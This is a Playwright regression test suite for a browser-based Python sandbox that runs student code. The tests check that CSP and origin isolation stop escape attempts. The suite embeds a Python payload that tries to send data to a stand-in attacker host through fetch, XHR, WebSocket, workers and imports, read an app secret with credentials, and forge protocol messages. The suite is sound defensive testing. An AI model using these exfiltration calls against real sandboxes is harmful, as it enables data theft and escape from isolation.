// Browser security regression suite. Every test runs REAL Python in the real built runner.
// None of this is proof of complete sandbox security — it is a regression net for the specific
// guarantees in docs/python-runner.md. Run against: Chromium, Firefox, WebKit.
import { chromium } from "@playwright/test";
import { test, expect, connect, runCode, waitReady, deployed, TEST_PARENT, PROD_PARENT } from "./support.mjs";

const NETWORK_AND_STORAGE_ATTACKS = (attackerUrl, appApiUrl) => `
import js
from pyodide.ffi import create_proxy

def attempt(name, fn):
    try:
        fn(); print(name, "-> ran")
    except Exception as e:
        print(name, "-> EXC", type(e).__name__)

attempt("fetch attacker", lambda: js.fetch("${attackerUrl}/leak-fetch"))
attempt("fetch attacker no-cors", lambda: js.fetch("${attackerUrl}/leak-nocors", {"mode": "no-cors"}))
attempt("fetch attacker credentials", lambda: js.fetch("${attackerUrl}/leak-cred", {"credentials": "include"}))
def xhr():
    x = js.XMLHttpRequest.new(); x.open("GET", "${attackerUrl}/leak-xhr", False); x.send()
attempt("sync xhr attacker", xhr)
attempt("websocket attacker", lambda: js.WebSocket.new("${attackerUrl.replace("http", "ws")}/leak-ws"))
attempt("eventsource attacker", lambda: js.EventSource.new("${attackerUrl}/leak-es"))
attempt("dynamic import attacker", lambda: js.eval("import('${attackerUrl}/leak-import.js')"))
attempt("importScripts attacker", lambda: js.importScripts("${attackerUrl}/leak-importscripts.js"))
attempt("nested worker -> attacker", lambda: js.Worker.new("data:text/javascript,fetch('${attackerUrl}/leak-nested')"))
attempt("nested module worker from runner origin", lambda: js.Worker.new("/", {"type": "module"}))
attempt("service worker register", lambda: js.navigator.serviceWorker.register("/sw.js"))
attempt("BroadcastChannel post", lambda: js.BroadcastChannel.new("leak").postMessage("hello-from-student-code"))
attempt("indexedDB.open", lambda: js.indexedDB.open("leakdb", 1))
attempt("caches.open", lambda: js.caches.open("leakcache"))
attempt("fetch app secret (credentials)", lambda: js.fetch("${appApiUrl}/api/secret", {"credentials": "include"}))
def read_secret():
    x = js.XMLHttpRequest.new(); x.open("GET", "${appApiUrl}/api/secret", False); x.withCredentials = True; x.send()
    print("READ SECRET:", x.responseText)
attempt("sync xhr READ app secret", read_secret)
`;

async function settle(page, ms = 2500) {
  await page.waitForTimeout(ms);
}
async function hostState(page) {
  return page.evaluate(async () => ({
    broadcasts: window.__bc.slice(),
    databases: indexedDB.databases ? (await indexedDB.databases()).map((d) => d.name) : "unsupported",
    caches: typeof caches === "undefined" ? "unavailable (insecure context)" : await caches.keys(),
    localStorageSecret: localStorage.getItem("app_secret"),
    cookie: document.cookie,
  }));
}

test.describe("CSP and origin isolation (test build: hardening OFF, so the CSP is tested on its own)", () => {
  test.skip(deployed, "uses the test build, which is never deployed");

  test("student code cannot exfiltrate, reach the app's data, or touch app-origin storage", async ({ appPage, testRunner, attacker, appApi }) => {
    const { page, log } = await appPage(testRunner.parent);
    await connect(page, testRunner.url);
    const r = await runCode(page, NETWORK_AND_STORAGE_ATTACKS(attacker.url, appApi.url));
    expect(r.error, JSON.stringify(r.error)).toBeUndefined();
    await settle(page);

    // 0. the attempts really executed. If they had all errored out on interop, "nothing leaked" would prove
    //    nothing — so the non-CSP-governed ones (storage/messaging into the APP's origin) must have run.
    for (const name of ["BroadcastChannel post", "indexedDB.open", "caches.open", "fetch attacker", "fetch app secret (credentials)"]) {
      expect(r.ok.stdout, `attempt "${name}" must have executed (not errored on interop)`).toContain(`${name} -> ran`);
    }
    // 1. nothing reached the attacker's server, by any channel
    expect(attacker.seen, "attacker saw requests").toEqual([]);
    // 2. nothing reached the app's API (a real server on another site), with or without credentials
    expect(appApi.requests, "the app API was reached").toEqual([]);
    // 3. app-origin state is untouched: no broadcast, no IndexedDB/Cache entries in the APP's origin, secrets intact
    const state = await hostState(page);
    expect(state.broadcasts).toEqual([]);
    expect(state.databases).not.toContain("leakdb");
    expect(state.caches).not.toContain("leakcache");
    expect(state.localStorageSecret).toBe("LOCALSTORAGE_SECRET");
    expect(state.cookie).toContain("visible_cookie=VISIBLE_COOKIE");
    attacker.seen.length = 0;
  });

  test("control: with the CSP removed AND the canary bypassed (test build only) the same attacks DO leak egress — but still nothing of the app's", async ({ appPage, testRunner, attacker, appApi }) => {
    // This proves the matrix above can detect leaks, and shows the layering: the CSP is the egress
    // control, while the separate origin keeps app data safe even if the CSP were missing.
    const { page, log } = await appPage(testRunner.parent);
    await connect(page, testRunner.noCspUrl, { hooks: { skipCanary: true } });
    const r = await runCode(page, NETWORK_AND_STORAGE_ATTACKS(attacker.url, appApi.url));
    expect(r.error, JSON.stringify(r.error)).toBeUndefined();
    await settle(page, 3000);
    expect(attacker.seen.length, "the control must detect leaks").toBeGreaterThanOrEqual(3);
    expect(attacker.seen.some((x) => x.includes("leak-fetch"))).toBe(true);
    // origin isolation still holds: the app's page, storage and API are untouched
    const state = await hostState(page);
    expect(state.broadcasts).toEqual([]);
    expect(state.databases).not.toContain("leakdb");
    expect(state.caches).not.toContain("leakcache");
    expect(state.localStorageSecret).toBe("LOCALSTORAGE_SECRET");
    // Without the CSP the request CAN be sent to the app's API — but it arrives with NO cookie (cross-site)
    // and the response is unreadable (CORS), so the secret never reaches student code.
    expect(appApi.requests.length, "control: the egress control is really off").toBeGreaterThan(0);
    for (const request of appApi.requests) expect(request, "the app's cookie must never be sent cross-site").toContain("cookie=no");
    expect(r.ok.stdout).not.toContain("TOP-SECRET");
    // Some engines print an empty responseText instead of throwing for the blocked cross-origin read; either way it is empty.
    expect(r.ok.stdout).not.toMatch(/READ SECRET:[ \t]*\S/);
    attacker.seen.length = 0;
  });

  test("RUN FAILS CLOSED when the worker's CSP is missing: this run and every later one is refused", async ({ appPage, testRunner }) => {
    const { page } = await appPage(testRunner.parent);
    await connect(page, testRunner.noCspUrl);
    const first = await runCode(page, "print('should never run')");
    expect(first.error).toMatchObject({ kind: "fatal", reason: "csp-not-enforced", retryable: false });
    const second = await runCode(page, "print('still should not run')");
    expect(second.error).toMatchObject({ reason: "csp-not-enforced" });
    expect(await page.evaluate(() => window.__session.state)).toBe("failed");
  });

  test("the iframe's own origin is not the app's: runner storage is separate and nothing is shared", async ({ appPage, testRunner }) => {
    const { page } = await appPage(testRunner.parent);
    await connect(page, testRunner.url);
    await runCode(page, "print('hi')");
    const frameOrigin = await page.evaluate(() => document.querySelector("iframe").contentWindow.location.origin ?? "cross-origin").catch(() => "cross-origin");
    expect(frameOrigin).toBe("cross-origin"); // the app cannot even read it: different site
  });
});

test.describe("hardening, spoofing, privacy, approval (production build)", () => {
  test("hardened globals are gone, so there is nothing for student code to reach for", async ({ appPage, prodRunner }) => {
    const { page } = await appPage(prodRunner.parent);
    await connect(page, prodRunner.url);
    const r = await runCode(page, `
import js
names = ["fetch","XMLHttpRequest","WebSocket","WebTransport","EventSource","RTCPeerConnection","webkitRTCPeerConnection","BroadcastChannel","SharedWorker","Worker","importScripts","indexedDB","caches","MessageChannel"]
print("STILL PRESENT:", [n for n in names if getattr(js, n, None) is not None])
for n in ["localStorage","sessionStorage","document","window","cookieStore"]:
    print(n, "->", hasattr(js, n))
print("serviceWorker:", getattr(js.navigator, "serviceWorker", None) is not None, "| storage:", getattr(js.navigator, "storage", None) is not None)
`);
    expect(r.ok.stdout).toContain("STILL PRESENT: []");
    for (const n of ["localStorage", "sessionStorage", "document", "window", "cookieStore"]) expect(r.ok.stdout).toContain(`${n} -> False`);
    expect(r.ok.stdout).toContain("serviceWorker: False | storage: False");
  });

  test("student code cannot spoof protocol messages: the real result stands", async ({ appPage, prodRunner }) => {
    const { page } = await appPage(prodRunner.parent);
    await connect(page, prodRunner.url);
    const r = await runCode(page, `
import js
from pyodide.ffi import to_js
forged = [
  {"t": "result", "id": 1, "status": "ok", "durationMs": 1, "startupMs": 1, "mode": "restore", "snapshot": "ready", "truncated": False},
  {"t": "fatal", "reason": "disabled", "message": "forged"},
  {"t": "hello", "protocol": 1, "nonce": "00000000000000000000000000000000", "limits": {}, "build": {}},
  {"t": "ready", "initMs": 1, "mode": "build"},
]
for m in forged:
    obj = to_js(m, dict_converter=js.Object.fromEntries)
    js.postMessage(obj)
    js.self.postMessage(obj)
raise ValueError("the real outcome")
`);
    expect(r.error, JSON.stringify(r.error)).toBeUndefined();
    expect(r.ok.status).toBe("exception");
    expect(r.ok.exception).toBe("ValueError");
    expect(await page.evaluate(() => window.__session.state)).toBe("ready");
    const again = await runCode(page, "print('still healthy')");
    expect(again.ok.stdout).toBe("still healthy\n");
  });

  test("no student code (or any other data) is sent anywhere: every request is a GET to the runner or the app", async ({ appPage, prodRunner, attacker }) => {
    const { page, log } = await appPage(prodRunner.parent);
    const marker = "UNIQUE_STUDENT_MARKER_7f3a9c";
    await connect(page, prodRunner.url);
    const r = await runCode(page, `# ${marker}\nsecret_answer = "${marker}"\nprint(secret_answer)`);
    expect(r.ok.stdout).toContain(marker);
    await settle(page, 1000);
    const nonGet = log.requests.filter((q) => q.method !== "GET");
    expect(nonGet, JSON.stringify(nonGet)).toEqual([]);
    const leaking = log.requests.filter((q) => (q.url + q.post).includes(marker));
    expect(leaking, JSON.stringify(leaking)).toEqual([]);
    const runnerOrigin = new URL(prodRunner.url).origin;
    const strangers = log.requests.filter((q) => {
      const o = new URL(q.url).origin;
      return o !== runnerOrigin && o !== prodRunner.parent && !q.url.startsWith("data:") && !q.url.startsWith("blob:");
    });
    expect(strangers, JSON.stringify(strangers)).toEqual([]);
    expect(attacker.seen).toEqual([]);
  });

  test("a parent that is NOT approved never gets a handshake (and cannot be embedded)", async ({ appPage, prodRunner }) => {
    const { page } = await appPage("http://not-approved.test");
    await connect(page, prodRunner.url, { handshakeTimeoutMs: 4000 });
    const ready = await waitReady(page);
    expect(ready.error?.kind).toBe("unavailable");
    expect(await page.evaluate(() => window.__session.state)).toBe("failed");
  });

  test("the iframe is created with the least-privileged configuration", async ({ appPage, prodRunner }) => {
    const { page } = await appPage(prodRunner.parent);
    await connect(page, prodRunner.url);
    const attrs = await page.evaluate(() => {
      const f = document.querySelector("iframe");
      return { sandbox: f.getAttribute("sandbox"), allow: f.getAttribute("allow"), referrerpolicy: f.getAttribute("referrerpolicy"), src: f.getAttribute("src"), count: document.querySelectorAll("iframe").length };
    });
    expect(attrs).toMatchObject({ sandbox: "allow-scripts allow-same-origin", allow: "", referrerpolicy: "no-referrer", count: 1 });
    expect(new URL(attrs.src).origin).toBe(new URL(prodRunner.url).origin);
    expect((await waitReady(page)).ok.pyodideVersion).toMatch(/^\d+\.\d+\.\d+$/);
  });
});

test.describe("process isolation (Chromium only; Playwright disables Site Isolation by default, so it is forced on here)", () => {
  test.skip(({ browserName }) => browserName !== "chromium", "Chromium-specific CDP check");
  test.skip(deployed, "local topology");

  test("the cross-site runner iframe gets its own process when Site Isolation is on", async ({ testRunner }) => {
    const browser = await chromium.launch({ args: ["--site-per-process", "--disable-features=LocalNetworkAccessChecks"], ignoreDefaultArgs: ["--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,ThirdPartyStoragePartitioning,LensOverlay,PlzDedicatedWorker", "--disable-site-isolation-trials"] });
    try {
      const context = await browser.newContext();
      await (await import("./support.mjs")).installHost(context, testRunner.parent, { hostRequests: [] });
      const page = await context.newPage();
      await page.goto(`${testRunner.parent}/__runner-host`);
      await page.waitForFunction(() => window.__ready === true);
      await connect(page, testRunner.url);
      expect((await waitReady(page)).ok).toBeTruthy();
      const cdp = await context.newCDPSession(page);
      const { targetInfos } = await cdp.send("Target.getTargets");
      expect(targetInfos.some((t) => t.type === "iframe" && t.url.startsWith(testRunner.url))).toBe(true);
    } finally {
      await browser.close();
    }
  });
});
